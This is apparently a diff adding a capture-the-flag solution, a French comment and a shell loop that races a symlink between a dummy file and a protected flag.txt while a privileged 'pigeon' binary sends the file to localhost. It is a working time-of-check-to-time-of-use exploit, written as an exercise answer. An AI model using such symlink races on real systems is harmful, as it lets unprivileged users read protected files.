@@ -1,0 +1,10 @@
+entre le moment ou il y a le acces et le moment ou on open le fichier on veut creer un lien symbolique 
+
+
+while [ 1]; do
+	ln -sf fichierBidon fichierPigeon
+	/quetes/02-sys/04-pigeon/pigeon ~/fichierPigeon 127.0.0.1 9999 &
+	ln -sf /quetes/02-sy/04-pigeon/flag.txt fichierPigeon
+	#fichier Pigeon== lien symbolique qui alterne
+	#fichierBidon == un fichier bidon dont les permissions sont 777
+done
